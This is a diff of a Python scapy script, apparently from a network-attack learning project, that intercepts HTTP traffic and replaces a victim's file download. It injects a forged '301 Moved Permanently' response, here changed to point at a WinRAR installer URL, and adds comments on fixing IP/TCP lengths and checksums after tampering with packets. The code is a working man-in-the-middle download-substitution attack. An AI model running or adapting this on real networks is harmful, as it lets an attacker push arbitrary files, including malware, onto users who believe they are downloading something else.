@@ -119,7 +119,11 @@ def process_packet(packet):
 #
 
 # 11 So basically i have change my load in http response from 201 ok to 301 moved Permanently
-#     scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp"
+#      scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe"
+
+# 12 Now we changed the content for download. But like we did in dns spoofing , we need to remove the length field, checksum in the IP and
+#     Checksum in TCP layer . Reason for this change is - We modified the packet so the values in here would change
+#     Hence we need to update length and checksum accordingly
 
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
@@ -133,7 +137,7 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file we want to download")
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp"
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe"
             print(scapy_packet.show())
 
 
